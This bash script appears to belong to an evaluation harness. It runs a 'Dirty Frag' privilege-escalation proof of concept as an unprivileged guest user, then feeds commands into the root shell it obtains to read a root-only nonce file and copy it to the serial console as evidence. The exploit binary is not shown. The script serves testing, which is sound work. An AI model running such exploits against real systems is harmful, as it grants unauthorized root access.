#!/usr/bin/env bash
# Run the Dirty Frag PoC and read the root-only nonce through its root shell.
# Runs as xentry-guest. Host serial evidence is the decisive channel.
# Args: nonce_path poc_dir
set -euo pipefail
nonce_path="${1:?nonce_path}"
poc_dir="${2:?poc_dir}"
case "$nonce_path" in
  /*) ;;
  *) echo "nonce_path must be absolute" >&2; exit 2 ;;
esac
case "$nonce_path" in
  *[[:space:]]*) echo "nonce_path must not contain whitespace" >&2; exit 2 ;;
esac
cd "$poc_dir"
# The first cat goes to the SSH transcript; the second writes a labeled copy to
# the guest serial console so the broker can read host-side evidence.
printf 'cat %s\nprintf "xentry-root-evidence:" > /dev/ttyS0; cat %s > /dev/ttyS0 2>&1\nexit\n' "$nonce_path" "$nonce_path" | ./exp
